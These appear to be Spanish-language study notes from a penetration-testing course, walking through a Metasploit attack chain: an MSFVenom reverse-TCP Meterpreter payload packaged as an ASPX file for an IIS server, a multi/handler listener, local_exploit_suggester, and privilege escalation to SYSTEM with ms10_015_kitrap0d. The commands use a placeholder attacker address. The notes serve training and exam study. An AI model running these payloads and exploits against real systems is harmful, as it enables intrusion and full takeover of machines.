
## 1. ¿Qué es MSFVenom?

**MSFVenom** es la herramienta que combina las funcionalidades de `MSFPayload` y `MSFEncode`.

- **MSFPayload:** generaba payloads para arquitecturas y sistemas operativos específicos.
    
- **MSFEncode:** permitía codificar payloads para evitar determinados caracteres problemáticos (_bad characters_) y, antiguamente, intentar evadir soluciones de seguridad.
    
- **MSFVenom:** integra ambas funcionalidades en una única herramienta.
    

La codificación puede ayudar a adaptar un payload a determinadas restricciones técnicas, pero **no garantiza la evasión de antivirus modernos**. Las soluciones actuales también utilizan análisis heurístico, aprendizaje automático e inspección del tráfico.

## 2. Generar un payload con MSFVenom

La sintaxis general es:

```
msfvenom -p <PAYLOAD> LHOST=<IP_ATACANTE> LPORT=<PUERTO> -f <FORMATO>
```

### Parámetros principales

|Parámetro|Función|
|---|---|
|`-p`|Selecciona el payload.|
|`LHOST`|Dirección IP local a la que se conectará el payload.|
|`LPORT`|Puerto local utilizado para recibir la conexión.|
|`-f`|Formato de salida del payload.|
|`-a`|Arquitectura de destino.|
|`--platform`|Plataforma de destino.|
|`-b`|Especifica caracteres que deben evitarse (_bad characters_).|
|`-e`|Selecciona un codificador.|
|`-i`|Número de iteraciones de codificación.|
|`-o`|Archivo de salida.|

Si no se especifican la plataforma o la arquitectura, MSFVenom puede seleccionarlas automáticamente según el payload.

### Ejemplo del módulo

El curso muestra un escenario en el que un servidor Windows ejecuta IIS y permite acceder por FTP a archivos publicados posteriormente en la web.

Se identifica que el servidor puede ejecutar archivos ASPX y se genera un payload de Meterpreter para Windows:

```
msfvenom -p windows/meterpreter/reverse_tcp \
LHOST=<IP_ATACANTE> \
LPORT=1337 \
-f aspx > reverse_shell.aspx
```

El resultado es un archivo `reverse_shell.aspx` que contiene el payload generado.

**Importante:** el formato de salida debe ser compatible con el entorno en el que se pretende ejecutar el payload.

## 3. Preparar el listener con Multi/Handler

Cuando utilizamos un payload de conexión inversa, necesitamos un listener que reciba la conexión.

En Metasploit se utiliza el módulo `exploit/multi/handler`.

```
msfconsole -q
```

Configurar el listener:

```
use exploit/multi/handler
show options
set LHOST <IP_ATACANTE>
set LPORT 1337
run
```

El listener debe utilizar la misma dirección de escucha y el mismo puerto configurados en el payload.

### Flujo de ejecución del ejemplo

1. Identificar el servicio y el formato de archivo ejecutable en el objetivo.
    
2. Generar el payload con MSFVenom.
    
3. Preparar el listener con `multi/handler`.
    
4. Cuando el payload se ejecuta en el entorno objetivo, se intenta establecer la conexión inversa.
    
5. Si la conexión funciona, Metasploit abre una sesión de Meterpreter.
    

La ejecución del payload no tiene por qué mostrar contenido visual en el navegador. En el ejemplo, la página ASPX aparece en blanco, mientras que la conexión se recibe en el listener.

## 4. Gestionar la sesión de Meterpreter

Una vez establecida la conexión, podemos comprobar el contexto de ejecución y recopilar información del sistema.

```
meterpreter > getuid
meterpreter > sysinfo
meterpreter > ps
```

- `getuid`: muestra el usuario con el que se ejecuta la sesión.
    
- `sysinfo`: muestra información del sistema.
    
- `ps`: enumera los procesos disponibles.
    

En el ejemplo del curso, la sesión inicial se ejecuta como `IIS APPPOOL\Web`, una cuenta con permisos limitados.

Por tanto, obtener una sesión de Meterpreter **no significa que tengamos privilegios administrativos**.

## 5. Local Exploit Suggester

El módulo `post/multi/recon/local_exploit_suggester` permite identificar posibles exploits locales que podrían funcionar en el sistema comprometido.

### Buscar el módulo

```
msf6 > search local_exploit_suggester
msf6 > use post/multi/recon/local_exploit_suggester
show options
```

### Vincularlo a una sesión

```
set SESSION <ID_SESION>
run
```

El módulo comprueba posibles exploits teniendo en cuenta información como el sistema operativo y la arquitectura.

En el ejemplo se identifican varias opciones para Windows x86, entre ellas:

- `exploit/windows/local/bypassuac_eventvwr`
    
- `exploit/windows/local/ms10_015_kitrap0d`
    
- `exploit/windows/local/ms15_051_client_copy_image`
    

**Los resultados son sugerencias, no garantías:** algunos exploits pueden no funcionar debido a los permisos, la versión del sistema u otras condiciones del objetivo.

## 6. Escalada de privilegios local

Después de analizar los resultados del sugeridor, el curso utiliza `ms10_015_kitrap0d` como ejemplo de escalada de privilegios local.

### Consultar y configurar el módulo

```
msf6 > search kitrap0d
msf6 > use exploit/windows/local/ms10_015_kitrap0d
show options
```

Configurar la sesión y el listener:

```
set SESSION <ID_SESION>
set LHOST <IP_ATACANTE>
set LPORT 1338
run
```

El puerto de escucha debe coincidir con el configurado en el módulo.

Si el exploit funciona, puede abrirse una nueva sesión con privilegios superiores. Comprobamos el usuario:

```
meterpreter > getuid
```

En el ejemplo del curso, la sesión obtenida se ejecuta como:

```
NT AUTHORITY\SYSTEM
```

El resultado depende de que el sistema objetivo sea vulnerable y de que se cumplan los requisitos del exploit.

## 7. Flujo de trabajo para recordar

```
1. Enumerar el objetivo
   └── Identificar servicios, versiones y formatos compatibles.

2. Generar el payload
   └── msfvenom -p <PAYLOAD> LHOST=<IP> LPORT=<PUERTO> -f <FORMATO>

3. Preparar el listener
   └── use exploit/multi/handler
   └── set LHOST <IP>
   └── set LPORT <PUERTO>
   └── run

4. Obtener una sesión
   └── Comprobar la conexión en Metasploit.
   └── getuid
   └── sysinfo

5. Investigar posibles escaladas
   └── search local_exploit_suggester
   └── set SESSION <ID>
   └── run

6. Validar las opciones encontradas
   └── Investigar cada exploit sugerido.
   └── Comprobar sus requisitos y compatibilidad.

7. Verificar el resultado
   └── getuid
```

## 8. Conceptos clave para el examen

- **MSFVenom** combina la generación y codificación de payloads.
    
- `-p` selecciona el payload y `-f` su formato de salida.
    
- `LHOST` y `LPORT` deben corresponder con la configuración del listener.
    
- `multi/handler` permite recibir conexiones de payloads compatibles.
    
- Una conexión de Meterpreter no implica disponer de privilegios elevados.
    
- `local_exploit_suggester` identifica posibles exploits locales, pero sus resultados deben validarse.
    
- La arquitectura y la versión del sistema influyen en la compatibilidad de un exploit.
    
- La codificación de un payload no garantiza que un antivirus moderno no lo detecte.
